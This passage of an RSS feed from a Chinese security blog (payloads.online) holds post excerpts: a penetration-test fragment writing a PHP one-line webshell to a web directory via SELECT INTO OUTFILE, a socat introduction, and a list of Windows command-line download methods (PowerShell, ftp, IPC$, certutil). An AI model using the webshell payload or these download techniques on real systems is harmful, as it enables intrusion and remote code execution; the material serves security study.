&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">INTO&lt;/span> OUTFILE &lt;span style="color:#e6db74">&amp;#39;D:/WWW/***/master/&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。&lt;/p>
&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>socat 使用手册</title><link>https://payloads.online/tools/socat/</link><pubDate>Thu, 09 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/tools/socat/</guid><description>&lt;h2 id="socat简介">socat简介&lt;/h2>
&lt;p>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版，socat的官方网站：http://www.dest-unreach.org/socat/ 。&lt;/p>
&lt;p>Socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、socket（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。&lt;/p>
&lt;p>Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。&lt;/p>
&lt;p>socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：&lt;code>ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket&lt;/code>等。&lt;/p>
&lt;h2 id="socat的安装">socat的安装&lt;/h2>
&lt;h3 id="网络安装">网络安装：&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Debian/Ubuntu:&lt;code>apt-get install socat&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mac OSX:&lt;code>brew install socat&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ps:Kali linux 里已经集成了此工具&lt;/p>
&lt;h3 id="下载软件包">下载软件包&lt;/h3>
&lt;p>下载socat源代码包：http://www.dest-unreach.org/socat/download/&lt;/p>
&lt;h3 id="编译安装">编译安装&lt;/h3>
&lt;p>把下载的软件包解压后按照传统的方式编译安装：&lt;/p>
&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>Windows下命令行下载文件总结</title><link>https://payloads.online/archivers/2017-11-08/1/</link><pubDate>Wed, 08 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-08/1/</guid><description>&lt;h2 id="0x00-powershell">0x00 Powershell&lt;/h2>
&lt;p>win2003、winXP不支持&lt;/p>
&lt;p>$client = new-object System.Net.WebClient&lt;/p>
&lt;p>$client.DownloadFile(&amp;lsquo;&lt;a href="http://payloads.online/file.tar.gz'">http://payloads.online/file.tar.gz'&lt;/a>, &amp;lsquo;E:\file.tar.gz&amp;rsquo;)&lt;/p>
&lt;h2 id="0x01-ftp">0x01 ftp&lt;/h2>
&lt;p>ftp 192.168.3.2&lt;/p>
&lt;p>输入用户名和密码后&lt;/p>
&lt;p>lcd E:\file # 进入E盘下的file目录&lt;/p>
&lt;p>cd www # 进入服务器上的www目录&lt;/p>
&lt;p>get access.log # 将服务器上的access.log下载到E:\file&lt;/p>
&lt;p>可以参考：https://baike.baidu.com/item/ftp/13839&lt;/p>
&lt;h2 id="0x02-ipc">0x02 IPC$&lt;/h2>
&lt;p>copy \192.168.3.1\c$\test.exe E:\file&lt;/p>
&lt;p>可以参考：http://www.163164.com/jiqiao/163164com011.htm&lt;/p>
&lt;h2 id="0x03-certutil">0x03 Certutil&lt;/h2>
&lt;p>可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx&lt;/p>
&lt;p>应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2&lt;/p></description></item></channel></rss>